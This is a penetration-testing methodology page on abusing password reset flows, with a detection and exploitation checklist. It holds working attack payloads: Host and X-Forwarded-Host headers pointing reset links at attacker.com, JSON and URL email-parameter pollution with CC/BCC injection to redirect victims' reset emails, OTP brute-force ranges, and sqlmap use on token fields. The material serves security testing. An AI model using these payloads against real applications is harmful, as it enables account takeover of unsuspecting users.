# Password Reset Abuse

## Overview
Password reset functionality is one of the most security-critical flows in any web application. When improperly implemented, it can lead to account takeover, token leakage, email injection, and authentication bypass. This document covers a comprehensive testing methodology for password reset mechanisms.

## When This Happens

You should test for password reset abuse when:

- The application has a "Forgot Password" or "Reset Password" feature.
- Reset tokens or OTPs are sent via email or SMS.
- The reset flow involves multiple steps (request → token → new password).
- You observe reset tokens in URLs, request bodies, or response headers.

## Recon / Detection

### 1. Map the reset flow
- Trigger a password reset and capture the full flow in Burp Suite.
- Identify how the token is delivered (email link, OTP, inline response).
- Note the token format: is it a UUID, numeric OTP, JWT, or custom hash?

### 2. Check token exposure
- Search Burp history for the reset token — does it appear in any other request or response?
- Check if the token passes over HTTP (not HTTPS).
- Inspect Referer headers on the reset page — does the token leak to third-party resources?

### 3. Identify parameter surface
- Use Arjun to discover hidden parameters on the reset endpoint:
  ```bash
  arjun -u https://target.com/resetpass -m POST -o reset_params.txt
  ```
- Look for email, token, user_id, and similar fields that may be manipulable.

## Exploitation Steps

### 1. Rate limiting and email bombing
- Send multiple rapid reset requests for the same account.
- Check if there is rate limiting on the email-sending endpoint.
- **Impact**: Email bombing, SMTP resource exhaustion, user annoyance.

### 2. Token security and transmission
| Test | What to check | Risk |
|------|--------------|------|
| HTTP vs HTTPS | Is the reset link sent over plain HTTP? | Token interception via MITM |
| Token in history | Does the token appear in other requests/responses? | Token exposure → account takeover |
| OTP in response | Is the OTP leaked in the API response body? | Direct bypass |
| Referer leakage | Does the reset page leak the token via Referer header? | Token stolen by third-party scripts |

### 3. Session management after reset

- **Email change + stale token**: Request a reset → log in → change email → click the old reset link. If the password changes, the token was not invalidated.
- **Password change + stale token**: Request a reset → log in → change password normally → click the old reset link. If it still works, tokens do not expire on password change.
- **Session persistence**: Log in from two browsers → reset password in browser A → check if browser B's session is terminated. If not, active sessions survive password resets.

### 4. Authentication bypass via reset flow
- Request a reset and **do not** click the link.
- Navigate directly to `/profile`, `/account`, `/home`, or `/dashboard`.
- If you gain access, the application grants authentication just from initiating the reset.

### 5. OTP and token brute force

For numeric OTPs:
```
POST /api/verify-otp
{"otp": "§0000§"}

→ Burp Intruder: payload = 0000–9999
→ Or Turbo Intruder for speed
```

For UUID v1 tokens:
- UUID v1 includes a timestamp component (e.g., `70d589f4-93b6-11ef-b864-0242ac120002`).
- Use a **sandwich attack**: request your own reset, then the victim's, then yours again. Predict the victim's token from the two known timestamps.

### 6. Host header injection (password reset poisoning)

The goal is to make the application generate a reset link pointing to your domain.

**Techniques:**
```http
# Double Host header
Host: target.com
Host: attacker.com

# Absolute URL with attacker host
GET https://target.com/ HTTP/1.1
Host: attacker.com

# Space-based bypass
Host: target.com  Host: attacker.com

# URL confusion patterns
Host: attacker.com?.target.com
Host: attacker.com/target.com
Host: target.com%23@attacker.com
Host: attacker.com (subdomain variation)

# Override headers
X-Forwarded-Host: attacker.com
X-Forwarded-For: attacker.com
Referrer: https://attacker.com/
Origin: attacker.com
```

**Impact**: If the server uses the Host header to build the reset URL, the victim receives a link like `https://attacker.com/reset?token=SECRET`, leaking their token.

### 7. IDOR and email parameter manipulation

**Direct IDOR:**
- Complete the reset flow for your account.
- If the email appears in the reset request body, change it to the victim's email.

**JSON parameter injection:**
```json
{"email":"victim@target.com","email":"attacker@target.com"}
{"email":["victim@target.com","attacker@target.com"]}
{"email":"victim@target.com\ncc:attacker@target.com"}
{"email":"victim@target.com,attacker@target.com"}
{"email":"victim@target.com%0Abcc:attacker@target.com"}
```

**URL-encoded injection:**
```
email=victim@target.com&email=attacker@target.com
email=victim@target.com%0a%0dcc:attacker@target.com
email=victim@target.com%20attacker@target.com
email=victim@target.com|attacker@target.com
```

**Edge cases:**
```
email=victim          (no domain)
email=victim@target   (no TLD)
user[email][]=victim@target.com&user[email][]=attacker@target.com
```

### 8. Injection via reset parameters

- Test the reset code or token field for SQL injection:
  ```bash
  sqlmap -r reset_request.txt
  ```
- Test for SSTI if the token/email is reflected in a confirmation page.

## Example Payloads

**Host header poisoning:**
```http
POST /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
Content-Type: application/json

{"email":"victim@target.com"}
```

**Email parameter pollution:**
```json
{"email":"victim@target.com","email":"attacker@target.com"}
```

**OTP brute force range:**
```
0000 → 9999 (4-digit)
000000 → 999999 (6-digit)
```

## Tools

- **Burp Suite**: Intercept, Repeater, Intruder for token analysis and brute force.
- **Turbo Intruder**: High-speed OTP brute forcing.
- **Arjun**: Hidden parameter discovery on reset endpoints.
- **sqlmap**: SQL injection in token/code fields.
- **Collaborator / RequestRepo**: Detect host header injection callbacks.

## Real-World Notes

- Password reset abuse is a **high-impact** finding category because it directly leads to account takeover.
- Always test the full lifecycle: request → token delivery → token usage → session state after reset.
- Host header poisoning is often overlooked but very common in applications that dynamically build URLs from request headers.
- Combine email injection with IDOR — if you can control which email receives the reset, and also inject CC/BCC headers, the impact multiplies.

## Testing Checklist

| Priority | Test |
|----------|------|
| **Critical** | Rate limiting on reset endpoint |
| **Critical** | Token transmission over HTTPS |
| **Critical** | Session termination after reset |
| **Critical** | Host header injection |
| **High** | Authentication bypass via reset flow |
| **High** | OTP brute force |
| **High** | IDOR via email manipulation |
| **Medium** | SQL injection in token fields |
| **Medium** | Hidden parameter discovery |
| **Medium** | Token expiration validation |

## References

- `methodology/web-recon-methodology.md`
- `techniques/jwt-attacks-and-misconfigurations.md`
- `tools/recon-tools.md`
